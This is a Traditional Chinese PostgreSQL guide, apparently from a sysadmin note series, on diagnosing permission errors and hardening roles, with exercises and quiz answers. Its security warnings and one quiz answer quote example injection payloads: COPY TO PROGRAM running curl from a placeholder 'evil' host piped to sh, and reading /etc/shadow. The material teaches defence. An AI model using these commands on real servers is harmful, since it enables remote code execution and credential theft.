**【1】** 先讀懂錯誤訊息的關鍵字 —— 它已經告訴你卡在第幾關

```text
FATAL:  no pg_hba.conf entry for ...      → 第 ① 關，去 04 篇，本篇幫不上忙
FATAL:  role "x" is not permitted to login → 第 ② 關，角色沒有 LOGIN
FATAL:  password authentication failed     → 第 ③ 關，密碼或 .pgpass
FATAL:  permission denied for database     → 第 ④ 關，缺 CONNECT
ERROR:  permission denied for schema       → 第 ⑤a 關，缺 USAGE
ERROR:  permission denied for table/sequence → 第 ⑤b 關，缺物件權限
ERROR:  must be owner of ...               → 不是權限不足，是【你不是擁有者】
ERROR:  relation "x" does not exist        → ★★★★ 不是權限問題，是 search_path
（沒有訊息，結果變少）                        → 第 ⑥ 關，RLS
```

★★★★ `FATAL` 開頭的是**連線階段**（前四關），`ERROR` 開頭的是**已經連上之後**（後兩關）。光看這一個字就能砍掉一半的排查範圍。

**【2】** 確認你「現在是誰、在哪個庫、search_path 是什麼」

```bash
PGPASSFILE=/etc/pg-credentials/hr_app.pgpass \
  psql "host=127.0.0.1 dbname=hr_app user=app_hr" \
  -c "SELECT session_user, current_user, current_database(), current_schemas(true);"
```

```text
 session_user | current_user | current_database |    current_schemas
--------------+--------------+------------------+-------------------------
 app_hr       | app_hr       | hr_app           | {pg_catalog,public}
```

- `current_schemas` 裡**沒有 `app`** → 問題是 search_path，跳到【7】
- `current_database` 不是你以為的那個 → 你剛剛的 `GRANT` 下在別的庫，跳到【6】
- `current_user` 與 `session_user` 不同 → 有 `SET role`，權限要以 `current_user` 判斷

**【3】** 用伺服器的判斷函式，一次問清楚五道關卡

```bash
sudo -u postgres psql -d hr_app -c "
SELECT has_database_privilege('app_hr','hr_app','CONNECT')          AS c_db,
       has_schema_privilege  ('app_hr','app','USAGE')               AS u_schema,
       has_table_privilege   ('app_hr','app.orders','SELECT')       AS r_tbl,
       has_table_privilege   ('app_hr','app.orders','INSERT')       AS a_tbl,
       has_sequence_privilege('app_hr','app.orders_id_seq','USAGE') AS u_seq;"
```

```text
 c_db | u_schema | r_tbl | a_tbl | u_seq
------+----------+-------+-------+-------
 t    | t        | t     | t     | f
```

★★★★ 這行輸出直接指出答案：`u_seq = f` —— `SELECT` 會過、`INSERT` 會炸，正是「序列權限」那個經典坑。第一個 `f` 出現在哪一欄，問題就在哪一關。

**【4】** 看物件實際的 ACL，確認 GRANT 到底有沒有寫進去

```bash
sudo -u postgres psql -d hr_app -c '\dp app.orders'
```

```text
 Schema |  Name  | Type  |        Access privileges         | Column privileges
--------+--------+-------+----------------------------------+-------------------
 app    | orders | table | hr_owner=arwdDxt/hr_owner       +|
        |        |       | hr_rw=arwd/hr_owner              |
```

- **Access privileges 完全空白** → 這張表還是出廠預設，你的 `GRANT` 沒下到這個庫（回【6】）
- **有 `hr_rw=arwd` 但你的帳號是 `app_hr`** → 檢查成員關係，跳到【5】
- **出現 `=r/...`（等號開頭）** → ★★★★ 對 PUBLIC 開放，這是資安缺失，要處理

**【5】** 檢查成員關係與繼承選項

```bash
sudo -u postgres psql -c '\drg app_hr'
```

```text
        List of role grants
 Role name | Member of | Options | Grantor
-----------+-----------+---------+----------
 app_hr    | hr_rw     | SET     | postgres
```

★★★★ `Options` 只有 `SET`、沒有 `INHERIT` → 權限**不會自動生效**，該連線必須先 `SET ROLE hr_rw;`。這是 PG16 之後最容易被誤設的一項。修法：

```bash
sudo -u postgres psql -c "GRANT hr_rw TO app_hr WITH INHERIT TRUE;"
```

```text
GRANT ROLE
```

**【6】** 確認你剛剛的 `GRANT` 下在正確的資料庫

```bash
sudo -u postgres psql -Atc "SELECT datname FROM pg_database WHERE datallowconn;" | \
while read -r db; do
  printf '%-12s %s\n' "$db" \
    "$(sudo -u postgres psql -d "$db" -Atc "SELECT has_table_privilege('app_hr','app.orders','SELECT');" 2>/dev/null || echo '-')"
done
```

```text
postgres     -
hr_app       t
acc_app      -
```

看到只有 `hr_app` 是 `t` 才對。若全部是 `-` 而你確定下過 `GRANT`，八成是下在 `postgres` 庫且那裡沒有 `app.orders`（所以連錯誤都吞掉了）。

**【7】** 排除 search_path 誤判

```bash
psql "host=127.0.0.1 dbname=hr_app user=app_hr" -c "SELECT count(*) FROM orders;"
```

```text
ERROR:  relation "orders" does not exist
```

```bash
psql "host=127.0.0.1 dbname=hr_app user=app_hr" -c "SELECT count(*) FROM app.orders;"
```

```text
 count
-------
  1024
```

★★★★ 兩個結果不同 → 百分之百是 search_path，**不要再去改權限**。修法：

```bash
sudo -u postgres psql -c "ALTER ROLE app_hr IN DATABASE hr_app SET search_path = app, public;"
```

改完**必須重新連線**才生效（連線池要重啟）。

**【8】** 都對卻還是少資料 —— 查 RLS

```bash
sudo -u postgres psql -d hr_app -c "
SELECT relname, relrowsecurity, relforcerowsecurity
FROM pg_class WHERE relnamespace='app'::regnamespace AND relrowsecurity;"
```

```text
 relname | relrowsecurity | relforcerowsecurity
---------+----------------+---------------------
 staff   | t              | f
```

```bash
sudo -u postgres psql -d hr_app -c "SELECT policyname, roles, cmd, qual FROM pg_policies WHERE tablename='staff';"
```

有列出來就是 RLS 在過濾。★★★★ 這時**不要**急著給 `BYPASSRLS`（那等於把個資遮蔽整個關掉），正確做法是補一條對應的 policy，見 [[08-PostgreSQL-安全強化]]。

---

## 安全性注意事項

> [!danger] ★★★★★ 絕對禁止：把 `SUPERUSER` 給應用帳號
> `.env` 裡填 `DB_USERNAME=postgres` 的後果，不是「多一點權限」而是**整台機器**：
> ```sql
> -- 一個 SQL injection 就能執行
> COPY (SELECT '') TO PROGRAM 'bash -c "curl http://evil/s|sh"';   -- 直接拿 shell
> COPY x FROM '/etc/shadow';                                       -- 讀任何檔案
> ```
> superuser 還會**繞過 RLS 與所有 policy**，個資遮蔽形同虛設。
> 檢查：`SELECT rolname FROM pg_roles WHERE rolsuper;` **除了 `postgres` 不該有第二個**。

> [!danger] ★★★★★ 絕對禁止：把 `pg_execute_server_program` / `pg_read_server_files` / `pg_write_server_files` 給任何應用或報表帳號
> 這三個預定義角色等同於「以 postgres 系統帳號的身分執行指令、讀寫任何檔案」，
> 拿到其中一個就能寫 webshell 到 `/var/www/html/`、讀 `~postgres/.pgpass` 拿到所有資料庫密碼。
> 它們存在只為了某些備份工具，**且應該只在需要的那段時間授予、用完立刻 `REVOKE`**。

> [!danger] ★★★★★ 絕對禁止：讓表對 `PUBLIC` 有任何權限
> `GRANT SELECT ON app.staff TO PUBLIC;` 的意思是「這個資料庫裡**任何**能登入的角色都讀得到」——
> 包含明年新增的廠商帳號、包含監控帳號、包含你忘記刪的測試帳號。
> 一張含身分證號的表這樣開，就是個資法上的「未依規定採取適當安全維護措施」。
> 每季盤點：`SELECT n.nspname,c.relname,c.relacl FROM pg_class c JOIN pg_namespace n ON n.oid=c.relnamespace WHERE array_to_string(c.relacl,',') LIKE '=%';` **必須 0 列**。

> [!danger] ★★★★ 絕對禁止：`CREATE ROLE ... PASSWORD '明文'` 打在互動式 psql 裡
> 這行同時外洩到 `~/.psql_history`（常是 644）、伺服器日誌（`log_statement` 只要不是 `none`）、
> 以及 `ps -ef`（若用 `psql -c`）。三個地方都會被系統備份帶走，等於這組密碼永久有效地躺在備份裡。
> 用 `\password <role>`；腳本內先 `SET log_statement='none';`。

> [!warning] ★★★★ `BYPASSRLS` 是靜默的
> 給了它，個資遮蔽全部失效，而且**沒有任何日誌或錯誤訊息**告訴你發生了什麼。
> 定期檢查：`SELECT rolname FROM pg_roles WHERE rolbypassrls;`

### 機關情境的五個要求

| 要求 | 在 PostgreSQL 上怎麼落實 | 星級 |
| --- | --- | --- |
| **個資最小揭露**（個資法第 27 條的安全維護義務） | 欄位層 `GRANT SELECT (id,name,dept)`，身分證號／地址一律不授；必要時搭配 RLS | ★★★★★ |
| **可歸責的稽核軌跡** | 每個人／每支程式**一個獨立登入角色**，共用帳號等於稽核失效；`session_user` 才是追人的欄位 | ★★★★★ |
| **最小權限** | 應用帳號只有 CRUD、沒有 DDL；DDL 走 `mig_hr` + `SET ROLE`，且只在部署視窗啟用 | ★★★★ |
| **權限定期複核** | 每季匯出盤點 CSV（下方速查表有指令），對照組織圖與離職名單 | ★★★★ |
| **變更留痕** | 每次 `GRANT` / `REVOKE` 前後各存一次 `pg_dumpall --roles-only`，檔名帶時間戳與核可單號 | ★★★★ |

★★★ 法規面的完整說明見 [[07-台灣資安法規與個資法]]，稽核佐證的整理方式見 [[09-資安稽核與符合性檢核]]。
本篇**不引用任何 TWGCB 條號** —— PostgreSQL 目前沒有對應的政府組態基準文件，看到有人引用請要求他出示文號。

---

## 速查表

### 角色管理

| 指令 | 說明 | 星級 |
| --- | --- | --- |
| `CREATE ROLE g NOLOGIN;` | 建群組角色（裝權限用） | ★★★★ |
| `CREATE ROLE u LOGIN CONNECTION LIMIT 20;` | 建登入角色，**不在這裡寫密碼** | ★★★★ |
| `\password u`（psql 內） | **設密碼的正解**，明文不離開用戶端 | ★★★★★ |
| `GRANT g TO u;` | 加入群組（預設 INHERIT + SET） | ★★★★ |
| `GRANT g TO u WITH INHERIT FALSE, SET TRUE;` | 只能 `SET ROLE`，平常不繼承（PG16+） | ★★★★ |
| `REVOKE g FROM u;` | 移出群組 | ★★★ |
| `ALTER ROLE u NOLOGIN;` | **停用帳號**（等同 MySQL 的 ACCOUNT LOCK） | ★★★★ |
| `ALTER ROLE u VALID UNTIL '2026-12-31';` | 密碼到期日（★★★★ 不擋 peer/trust） | ★★★ |
| `ALTER ROLE u IN DATABASE d SET statement_timeout='60s';` | 逐角色資源限制 | ★★★★ |
| `REASSIGN OWNED BY u TO g;` → `DROP OWNED BY u;` → `DROP ROLE u;` | **刪角色的唯一正確順序**（前兩步每庫各做） | ★★★★★ |

### 授權與撤銷

| 指令 | 說明 | 星級 |
| --- | --- | --- |
| `REVOKE ALL ON DATABASE d FROM PUBLIC;` | **收斂的第一步** | ★★★★★ |
| `GRANT CONNECT ON DATABASE d TO u;` | 第 ④ 關 | ★★★★ |
| `GRANT USAGE ON SCHEMA s TO g;` | 第 ⑤a 關，**最常漏** | ★★★★★ |
| `GRANT SELECT,INSERT,UPDATE,DELETE ON ALL TABLES IN SCHEMA s TO g;` | 既有表（快照，不管未來） | ★★★★ |
| `GRANT USAGE,SELECT ON ALL SEQUENCES IN SCHEMA s TO g;` | serial／bigserial 的 INSERT 必備 | ★★★★★ |
| `ALTER DEFAULT PRIVILEGES FOR ROLE o IN SCHEMA s GRANT ... ON TABLES TO g;` | **未來的表**（規則） | ★★★★★ |
| `GRANT SELECT (c1,c2) ON s.t TO g;` | 欄位層，個資最小揭露 | ★★★★ |
| `REVOKE CREATE ON SCHEMA public FROM PUBLIC;` | 升級上來的叢集必補 | ★★★★ |
| `GRANT pg_read_all_data TO bak;` | 備份帳號，**不必給 superuser** | ★★★★ |
| `SET ROLE o;` / `RESET ROLE;` | 臨時提權與降回 | ★★★★ |

### 診斷查詢

| 指令 | 說明 | 星級 |
| --- | --- | --- |
| `SELECT session_user, current_user, current_database(), current_schemas(true);` | **permission denied 的第一條指令** | ★★★★★ |
| `has_table_privilege('u','s.t','SELECT')` | 逐關驗證，不必真的連一次 | ★★★★★ |
| `has_schema_privilege` / `has_database_privilege` / `has_sequence_privilege` | 同上，對應第 ④⑤a⑤b 關 | ★★★★ |
| `pg_has_role('u','g','MEMBER')` | 成員關係是否成立 | ★★★★ |
| `SELECT rolname FROM pg_roles WHERE rolsuper;` | **只該有 postgres** | ★★★★★ |
| `SELECT rolname FROM pg_roles WHERE rolbypassrls;` | 個資遮蔽被繞過的名單 | ★★★★★ |
| `SELECT * FROM information_schema.role_table_grants;` | 權限盤點主查詢 | ★★★★ |
| `... WHERE array_to_string(relacl,',') LIKE '=%'` | **找出所有對 PUBLIC 開放的物件** | ★★★★★ |
| `SELECT rolname,setconfig FROM pg_roles r JOIN pg_db_role_setting s ON s.setrole=r.oid;` | 看逐角色的參數覆寫 | ★★★ |
| `SELECT relname,relrowsecurity FROM pg_class WHERE relrowsecurity;` | 哪些表開了 RLS | ★★★★ |

### psql 反斜線指令

| 指令 | 顯示什麼 | 星級 |
| --- | --- | --- |
| `\du` / `\dg` | 角色與屬性（★★★ PG16 起**沒有** Member of 欄） | ★★★★ |
| `\drg` | **成員關係 + ADMIN/INHERIT/SET 選項**（PG16+） | ★★★★★ |
| `\dp` / `\z` | 表／檢視／序列的 ACL 與欄位權限 | ★★★★★ |
| `\ddp` | **預設權限**（`ALTER DEFAULT PRIVILEGES` 的成果） | ★★★★★ |
| `\dn+` | schema 與其權限 | ★★★★ |
| `\l+` | 資料庫與其 ACL（看 `=Tc/` 有沒有清掉） | ★★★★ |
| `\password <role>` | 安全地設密碼 | ★★★★★ |
| `\conninfo` | 目前連到誰、用哪個角色、走不走 SSL | ★★★ |

### 檔案與路徑

| 路徑 | 用途 | 權限 | 星級 |
| --- | --- | --- | --- |
| `~/.pgpass` | 用戶端密碼檔（`host:port:db:user:pass`） | **600**（否則被忽略） | ★★★★★ |
| `~/.pg_service.conf` | 具名連線設定 | **600** | ★★★ |
| `~/.psql_history` | ★★★★ 明文密碼常躺在這 | 建議 600 或關閉 | ★★★★ |
| `/etc/postgresql/16/main/pg_hba.conf` | 第 ① 關（Ubuntu） | 640 postgres | ★★★★ |
| `/var/lib/pgsql/16/data/pg_hba.conf` | 同上（RHEL 系） | 600 postgres | ★★★★ |
| `/var/log/postgresql/postgresql-16-main.log` | `log_statement` 開著時密碼會在這 | 640 | ★★★★ |
| `/var/backups/pg-grants/` | 角色與 ACL 快照（**含密碼雜湊**） | **700 / 檔 600** | ★★★★★ |
| `/etc/pg-credentials/` | 產生的憑證檔 | **700 / 檔 600** | ★★★★ |

### 判斷準則

| 問題 | 判斷 | 星級 |
| --- | --- | --- |
| 應用帳號要不要能建表？ | **不要**。DDL 走獨立的 migration 角色 + `SET ROLE` | ★★★★ |
| 權限直接給登入角色還是給群組？ | **給群組**，登入角色只掛成員；人員異動才不用重打 GRANT | ★★★★ |
| `GRANT ON ALL TABLES` 做了就夠嗎？ | **不夠**，一定要配 `ALTER DEFAULT PRIVILEGES` 兩句一組 | ★★★★★ |
| 備份帳號給什麼？ | `pg_read_all_data`；若有 RLS 則需另行處理，**不要直接給 superuser** | ★★★★ |
| 帳號不用了先刪還是先停？ | 先 `NOLOGIN` 觀察 7~30 天，再 `REASSIGN`+`DROP OWNED`+`DROP ROLE` | ★★★★ |
| 看到 `relation does not exist` 要改權限嗎？ | **不要**，那是 search_path，先用全名 `schema.table` 驗證 | ★★★★ |
| 密碼怎麼給？ | `\password`；腳本用 `SET log_statement='none'` + `.pgpass`（600） | ★★★★★ |
| PUBLIC 上的權限可以留嗎？ | 資料庫的 `Tc` 要收、函式的 `X` 視情況、**表上一律 0** | ★★★★★ |

---

## 練習題

> [!question]- 練習 1：重現「migration 之後應用就 500」並修好
> **題目**：在測試機上刻意製造這個最經典的 PostgreSQL 權限故障，然後用兩句一組的正確做法修好。
>
> **步驟**
> ```sql
> CREATE DATABASE lab_db;
> \c lab_db
> CREATE ROLE lab_owner NOLOGIN;
> CREATE ROLE lab_rw    NOLOGIN;
> CREATE ROLE lab_app   LOGIN PASSWORD 'Lab-2026!';
> GRANT lab_rw TO lab_app;
> CREATE SCHEMA lab AUTHORIZATION lab_owner;
> GRANT USAGE ON SCHEMA lab TO lab_rw;
> SET ROLE lab_owner;
> CREATE TABLE lab.t1(id bigserial PRIMARY KEY, v text);
> RESET ROLE;
> GRANT SELECT, INSERT ON ALL TABLES IN SCHEMA lab TO lab_rw;   -- 只做了快照
> SET ROLE lab_owner;
> CREATE TABLE lab.t2(id bigserial PRIMARY KEY, v text);        -- 「明天的 migration」
> RESET ROLE;
> ```
>
> **參考解答**
> ```text
> 【故障重現】
>   $ psql "host=127.0.0.1 dbname=lab_db user=lab_app" -c "SELECT * FROM lab.t2;"
>   ERROR:  permission denied for table t2
>   ★★★★ t1 讀得到、t2 讀不到 —— 因為 GRANT ON ALL TABLES 是快照，t2 建立時它早就跑完了。
>
> 【第二個故障：序列】
>   $ psql ... -c "INSERT INTO lab.t1(v) VALUES('x');"
>   ERROR:  permission denied for sequence t1_id_seq
>   ★★★★ bigserial 的 INSERT 需要序列 USAGE，前面那句 GRANT 沒帶到序列。
>
> 【正確修法：兩句一組，四組全做】
>   -- 補既有物件
>   GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES    IN SCHEMA lab TO lab_rw;
>   GRANT USAGE, SELECT                  ON ALL SEQUENCES IN SCHEMA lab TO lab_rw;
>   -- 管未來物件（FOR ROLE 必須是實際建表的 lab_owner）
>   ALTER DEFAULT PRIVILEGES FOR ROLE lab_owner IN SCHEMA lab
>     GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO lab_rw;
>   ALTER DEFAULT PRIVILEGES FOR ROLE lab_owner IN SCHEMA lab
>     GRANT USAGE, SELECT ON SEQUENCES TO lab_rw;
>
> 【驗證：再建一張表，不再手動 GRANT】
>   SET ROLE lab_owner; CREATE TABLE lab.t3(id bigserial PRIMARY KEY, v text); RESET ROLE;
>   $ psql ... -c "INSERT INTO lab.t3(v) VALUES('ok'); SELECT * FROM lab.t3;"
>   INSERT 0 1
>    id | v
>   ----+----
>     1 | ok
>   ★★★★ 這次不用任何額外 GRANT 就通了，代表預設權限真的生效。
>   再用 \ddp 確認：Owner=lab_owner / Schema=lab / table 與 sequence 各一列。
>
> 【收尾】
>   \c postgres
>   DROP DATABASE lab_db;
>   DROP ROLE lab_app, lab_rw, lab_owner;
> ```

> [!question]- 練習 2：設計一個外部廠商的唯讀查詢角色（含個資遮蔽）
> **題目**：廠商要查 `app.staff` 做人力統計，**不得看到身分證號 `id_no` 與住址 `addr`**，
> 而且不能拖垮正式庫。廠商從 `10.0.9.0/24` 的跳板機連線。寫出完整語句與三項驗證。
>
> **參考解答**
> ```sql
> -- 【1】角色本身：★★★ 合約期就是密碼期
> CREATE ROLE ro_vendor LOGIN
>   CONNECTION LIMIT 2
>   VALID UNTIL '2026-12-31';
> -- 密碼用 psql 的 \password ro_vendor 設定，不要打在這裡
>
> -- 【2】前四關
> GRANT CONNECT ON DATABASE hr_app TO ro_vendor;
> \c hr_app
> GRANT USAGE ON SCHEMA app TO ro_vendor;
>
> -- 【3】★★★★ 欄位層授權：只給需要的欄，【不要】GRANT SELECT ON app.staff
> GRANT SELECT (id, name, dept, hire_date) ON app.staff TO ro_vendor;
>
> -- 【4】資源護欄
> ALTER ROLE ro_vendor IN DATABASE hr_app SET statement_timeout = '30s';
> ALTER ROLE ro_vendor IN DATABASE hr_app SET default_transaction_read_only = on;
> ALTER ROLE ro_vendor IN DATABASE hr_app SET search_path = app;
> ```
> ★★★★ 還要在 `pg_hba.conf` 加上來源限制（PostgreSQL 的角色本身**不帶來源資訊**）：
> ```text
> # TYPE  DATABASE  USER       ADDRESS        METHOD
> hostssl hr_app    ro_vendor  10.0.9.0/24    scram-sha-256
> ```
> 改完 `sudo systemctl reload postgresql@16-main`（reload 不是 restart，見 [[04-PostgreSQL-設定檔與pg_hba]]）。
>
> ```text
> 【驗證 1】授權欄位讀得到
>   $ psql "host=10.0.1.10 dbname=hr_app user=ro_vendor" -c "SELECT id,name,dept FROM staff LIMIT 1;"
>    id |  name  | dept
>   ----+--------+------
>     1 | 王小明 | 人事
>
> 【驗證 2】★★★★ 未授權欄位必須被擋
>   $ psql ... -c "SELECT id_no FROM staff LIMIT 1;"
>   ERROR:  permission denied for table staff
>   ★★★ 注意訊息說的是 table 不是 column，別因此以為是表層權限沒給。
>
> 【驗證 3】★★★★ SELECT * 也要被擋（最多人漏測這一項）
>   $ psql ... -c "SELECT * FROM staff LIMIT 1;"
>   ERROR:  permission denied for table staff
>
> 【驗證 4】逾時護欄生效
>   $ psql ... -c "SELECT pg_sleep(40);"
>   ERROR:  canceling statement due to statement timeout
>
> 【收尾】合約結束當天 ALTER ROLE ro_vendor NOLOGIN;
>         觀察 30 天無異常後 REASSIGN OWNED / DROP OWNED / DROP ROLE，
>         並留存 \dp app.staff 的輸出作為稽核佐證。
> ```

> [!question]- 練習 3：把「全部用 postgres 連線」的舊系統，安全地切換到最小權限角色
> **題目**：現有 Laravel `.env` 是 `DB_USERNAME=postgres`。在**不中斷服務**的前提下切成 `app_hr`，
> 並寫出出事時的回滾步驟。
>
> **參考解答**
> ```text
> 【1】改前快照（沒有這一步就不要往下做）
>   $ sudo -u postgres pg_dumpall --roles-only > /var/backups/pg-grants/roles-$(date +%FT%H%M).sql
>   $ sudo -u postgres pg_dump -s hr_app       > /var/backups/pg-grants/hr_app-schema-$(date +%FT%H%M).sql
>   $ sudo chmod 700 /var/backups/pg-grants; sudo chmod 600 /var/backups/pg-grants/*
>   ★★★★ 這兩份就是回滾腳本，確認【非空】再繼續。
>
> 【2】盤點應用到底用了什麼（不要用猜的）
>   -- 開一天 log_statement='mod' 或直接看 pg_stat_statements，確認有沒有 DDL
>   SELECT calls, left(query,60) FROM pg_stat_statements ORDER BY calls DESC LIMIT 20;
>   ★★★★ 若查到 CREATE TABLE / ALTER TABLE，代表 migration 也走同一組憑證，
>        必須額外準備 mig_hr，不能只建 app_hr。
>
> 【3】建立角色但【先不切換】—— 用 has_*_privilege 預先驗證
>   $ sudo /usr/local/bin/pg-role-bootstrap.sh --db hr_app --schema app --apply
>   $ sudo /usr/local/bin/pg-role-bootstrap.sh --db hr_app --schema app --verify
>   ★★★ verify 通過（唯讀帳號寫入被拒、PUBLIC 殘留 0 列）才進入下一步。
>
> 【4】用新帳號跑一次讀寫實測（此時 .env 還沒改，服務不受影響）
>   $ PGPASSFILE=/etc/pg-credentials/hr_app.pgpass \
>     psql "host=127.0.0.1 dbname=hr_app user=app_hr" -c \
>     "BEGIN; INSERT INTO app.orders(no) VALUES('PROBE'); SELECT count(*) FROM app.orders; ROLLBACK;"
>   INSERT 0 1
>    count
>   -------
>     1025
>   ROLLBACK
>   ★★★★ 用 BEGIN/ROLLBACK 包起來，測完不留痕跡。
>
> 【5】切換（維護視窗內，逐台）
>   - 改 .env：DB_USERNAME=app_hr / DB_PASSWORD=<新密碼>
>   - php artisan config:clear && php artisan config:cache
>   - 重啟 php-fpm（★★★★ Laravel 的連線池握著舊連線，不重啟不會生效）
>   - 打健康檢查端點：curl -sf https://hr.example.gov.tw/healthz  → 200
>   - 觀察 5 分鐘的錯誤日誌：sudo tail -f /var/log/postgresql/postgresql-16-main.log
>
> 【6】回滾（任何一步失敗就執行，目標 3 分鐘內恢復）
>   - .env 改回 DB_USERNAME=postgres → config:cache → 重啟 php-fpm
>   - 權限層若已改壞：sudo -u postgres psql -f /var/backups/pg-grants/roles-<時間戳>.sql
>   - 或直接 sudo pg-role-bootstrap.sh --db hr_app --rollback
>   ★★★★ 回滾必須在切換【之前】就演練過一次，正式當下不是學習時間。
>
> 【7】確認穩定 7 天後才收尾
>   - 確認 pg_stat_activity 裡沒有任何 usename='postgres' 的應用連線
>     SELECT usename, count(*) FROM pg_stat_activity GROUP BY 1;
>   - 留下變更紀錄：誰改、何時、核可單號、驗證證據（稽核會問）
> ```

---

## 小測驗

Q1. PostgreSQL 的角色跟 MySQL 的 `'user'@'host'` 最大的差別是什麼？這個差別導致「限制來源 IP」這件事要在哪裡做？

Q2. （是非）在 `psql -d postgres` 裡執行 `GRANT SELECT ON ALL TABLES IN SCHEMA app TO hr_ro;` 之後，`hr_ro` 就能讀 `hr_app` 資料庫裡 `app` schema 的所有表。

Q3. 你把應用帳號的權限全設好了，`SELECT` 正常，但 `INSERT` 噴 `ERROR: permission denied for sequence orders_id_seq`。原因是什麼？完整的修法是哪兩句？

Q4. 這行指令會發生什麼事？為什麼它在正式環境是災難？
```sql
GRANT pg_execute_server_program TO rpt_hr;
```

Q5. 團隊做完 `GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA app TO hr_rw;` 之後，隔週 migration 新增一張表，應用立刻 500。請說明成因，以及為什麼「每次 migration 後手動再 GRANT 一次」不是正確答案。

Q6. （選擇）以下哪一個**不會**讓 `ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app GRANT SELECT ON TABLES TO hr_ro;` 失效？
(A) migration 實際上是用 `mig_hr` 連線且沒有 `SET ROLE hr_owner`
(B) 只在 `hr_app` 資料庫執行過，另一個庫 `acc_app` 沒做
(C) 新表建在 `public` schema 而不是 `app`
(D) `hr_ro` 是 `NOLOGIN` 的群組角色

Q7. 看到 `ERROR: relation "orders" does not exist`，但你確定 `app.orders` 存在而且權限給了。你要先查哪裡？用什麼指令一分鐘內確認？

Q8. `DROP ROLE rpt_hr;` 回報 `cannot be dropped because some objects depend on it`。寫出完整的處理步驟，並說明為什麼 `DROP OWNED BY` 這一步特別危險。

Q9. 你要幫監控系統（Prometheus postgres_exporter）建一個帳號，同事說「給 SUPERUSER 最快」。請說明正確做法，以及 superuser 具體會多出哪三種你不想給的能力。

Q10. 稽核要你證明「`app.staff` 這張含身分證號的表沒有對外開放」。寫出你會執行的三條查詢與各自的預期輸出，並說明哪一條的結果若非預期就是資安缺失。

> [!question]- 測驗答案
> **Q1.** ★★★★ 最大的差別是：**PostgreSQL 的角色只有一個名字，不帶來源資訊**。
> MySQL 把來源寫進帳號本身（`'app'@'10.0.1.%'` 與 `'app'@'%'` 是兩個獨立帳號），
> PostgreSQL 則把「誰可以從哪裡、用什麼方式連進來」完全交給 `pg_hba.conf` 這個檔案。
> 所以「限制廠商只能從 `10.0.9.0/24` 連」這件事，**在 SQL 裡怎麼寫都做不到**，
> 必須寫成 `hostssl hr_app ro_vendor 10.0.9.0/24 scram-sha-256`，改完 reload。
> 這也解釋了為什麼 PostgreSQL 多一道「第 ① 關」：`FATAL: no pg_hba.conf entry for host ...`
> 這種錯誤在 MySQL 是不存在的，而它跟角色權限完全無關 —— 看到它就直接去 04 篇，
> 別浪費時間查 `\dp`。
> 見「觀念說明 → 五道關卡」與 [[04-PostgreSQL-設定檔與pg_hba]]。
>
> **Q2.** ★★★★ **錯，而且錯得很典型。**
> 角色本身（`pg_authid`、`pg_auth_members`）是**叢集層級**、全域共用的；
> 但物件的 ACL（`pg_class.relacl`、`pg_namespace.nspacl`、`pg_default_acl`）
> 是**每個資料庫各自獨立**的。
> 你在 `postgres` 這個資料庫裡下 `GRANT ... IN SCHEMA app`，如果那裡根本沒有 `app` schema，
> 會直接得到 `ERROR: schema "app" does not exist`；就算剛好有同名 schema，
> 授的也是 `postgres` 庫裡那些物件的權限，跟 `hr_app` 一點關係都沒有。
> 正確做法：`psql -d hr_app` 之後再授權，並用 `\dp app.*` 在**目標資料庫**確認。
> 排查時用【6】那支迴圈掃過所有資料庫，一眼看出你授到哪去了。
> 見「觀念說明 → 角色是叢集層級，權限是資料庫層級」與排查步驟【6】。
>
> **Q3.** ★★★★ 原因是 `bigserial` / `serial` 欄位的預設值是 `nextval('orders_id_seq')`，
> 執行 `INSERT` 時會去動那個**序列物件**，而序列是獨立於表的物件，有自己的 ACL。
> 只 `GRANT ... ON ALL TABLES` 不會帶到序列，所以 `SELECT` 正常、`INSERT` 掛掉 ——
> 這個「只有寫入壞掉」的症狀非常有辨識度。
> 完整修法是**兩句一組**，既有物件與未來物件都要：
> ```sql
> GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA app TO hr_rw;
> ALTER DEFAULT PRIVILEGES FOR ROLE hr_owner IN SCHEMA app
>   GRANT USAGE, SELECT ON SEQUENCES TO hr_rw;
> ```
> 一分鐘確認：`SELECT has_sequence_privilege('app_hr','app.orders_id_seq','USAGE');` 回 `f` 就是它。
> ★★★ 補充：若欄位改用 `GENERATED BY DEFAULT AS IDENTITY`，序列是表的相依物件，
> 就**不需要**額外的序列權限；Laravel 的 `$table->id()` 目前產生的是 `bigserial`，所以會踩到。
> 見「基礎操作 → GRANT 階梯」第 4 層與排查步驟【3】。
>
> **Q4.** ★★★★★ 這一行把「**在資料庫伺服器上執行任意作業系統程式**」的能力，
> 交給了一個報表帳號。拿到它的人（或打穿報表頁面的 SQL injection）可以：
> ```sql
> COPY (SELECT '') TO PROGRAM 'bash -c "curl http://evil/s.sh | sh"';
> ```
> 執行身分是 `postgres` 這個系統帳號 —— 也就是能讀 `~postgres/.pgpass`（拿到所有資料庫密碼）、
> 讀整個資料目錄、寫檔到任何 `postgres` 有權限的位置。
> 三個關鍵認知：
> 1. 它跟 `SUPERUSER` 的差別只是「少了幾樣」，攻擊面幾乎一樣大；
> 2. 授予它不會留下任何執行紀錄，除非你另外開了稽核；
> 3. `pg_read_server_files` 與 `pg_write_server_files` 同樣危險，三個一律不給應用／報表帳號。
> 報表帳號要的是 `pg_read_all_data` 或明確的 `GRANT SELECT`，不是這個。
> 見「安全性注意事項」第二則 danger 與「預定義角色」那張表。
>
> **Q5.** ★★★★★ 成因：`GRANT ... ON ALL TABLES IN SCHEMA` 在 PostgreSQL 裡是一個
> **批次動作**而不是**規則** —— 它把執行當下存在的每一張表逐一寫進 ACL，
> 對之後新建的表毫無效力。MySQL 的 `GRANT ... ON db.*` 是規則，所以從 MySQL 過來的人一定會踩。
> 「每次 migration 後手動再 GRANT 一次」不是正確答案，因為：
> 1. 它依賴人記得 —— 半夜緊急上版、換人值班、CI 自動部署時一定會漏；
> 2. 漏掉的當下**不會有任何警告**，要等使用者打電話來才知道；
> 3. 它把「權限設計」變成「部署步驟」，稽核時無法證明權限是穩定的。
> 正解是 `ALTER DEFAULT PRIVILEGES FOR ROLE <建表者> IN SCHEMA app GRANT ... ON TABLES TO hr_rw;`
> 並且用 `ALTER ROLE mig_hr IN DATABASE hr_app SET role='hr_owner';` 保證建表者永遠是同一個角色。
